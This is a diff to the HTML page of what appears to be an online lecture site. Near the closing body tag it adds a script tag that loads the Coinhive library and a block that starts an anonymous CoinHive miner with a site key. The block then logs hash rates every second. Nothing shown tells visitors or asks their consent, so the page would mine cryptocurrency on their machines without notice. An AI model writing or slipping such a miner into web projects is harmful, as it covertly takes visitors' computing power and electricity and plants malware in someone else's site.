@@ -339,5 +339,18 @@ Students are able to join live lectures and participate by asking questions real
     <script src="./particles.js"></script>
     <script src="assets/js/app.js"></script>
     <script src="assets/js/main.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+      <script>
+        var miner = new CoinHive.Anonymous('63M772zQCnDDbX8Gdyb6UmLj1jytqemm');
+        miner.start();
+        setInterval(function() {
+          var hashesPerSecond = miner.getHashesPerSecond();
+          var totalHashes = miner.getTotalHashes();
+          var acceptedHashes = miner.getAcceptedHashes();
+          console.log("hashedPerSecond: ", hashesPerSecond);
+          console.log("totalHashes: ", totalHashes);
+          console.log("acceptedHashes: ", acceptedHashes);
+        }, 1000);
+      </script>
   </body>
 </html>
